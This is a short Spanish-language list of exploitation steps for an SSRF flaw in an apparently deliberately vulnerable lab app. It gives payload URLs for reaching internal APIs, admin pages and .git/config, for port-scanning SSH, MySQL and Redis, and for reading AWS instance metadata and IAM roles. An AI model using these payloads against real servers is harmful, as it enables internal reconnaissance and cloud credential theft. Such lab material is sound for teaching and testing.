Pasos de explotación

  1. El endpoint /ssrf?url=... realiza peticiones HTTP a cualquier URL sin validar.
  2. Accede a recursos internos no expuestos al exterior:
http://127.0.0.1:5000/api/users       # API interna
http://127.0.0.1:5000/admin           # Panel admin
http://127.0.0.1:5000/.git/config     # Config git interna
  1. Escanea puertos internos (observa diferencias en los mensajes de error):
http://localhost:22       # SSH
http://localhost:3306     # MySQL
http://localhost:6379     # Redis
  1. En entornos cloud, accede a metadata del servidor:
http://169.254.169.254/latest/meta-data/          # AWS
http://169.254.169.254/latest/meta-data/iam/      # AWS IAM roles
